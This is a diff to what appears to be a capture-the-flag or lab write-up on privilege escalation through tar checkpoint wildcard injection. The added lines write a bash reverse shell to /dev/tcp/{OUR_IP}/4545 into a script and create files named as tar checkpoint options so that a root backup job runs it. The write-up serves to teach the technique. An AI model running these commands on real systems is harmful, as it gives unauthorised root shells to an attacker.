@@ -160,6 +160,15 @@ This whole thing will be interpreted as ```tar -cf /opt/backups/backup.tar --che
 
 After some more research, I found another useful resource that explains how to use ```--checkpoint``` and ```--checkpoint-action``` options of tar. https://www.gnu.org/software/tar/manual/html_section/checkpoints.html
 
+Our command looks like this
+
+```
+echo "bash -c 'bash -i >& /dev/tcp/{OUR_IP}/4545 0>&1'" > shell.sh
+touch "--checkpoint=1"
+touch "--checkpoint-action=exec=sh shell.sh"
+chmod 777 shell.sh
+```
+
 Let's try start our netcat and run the command.
 
 ![priv_es_3](img/priv_es_3.png)
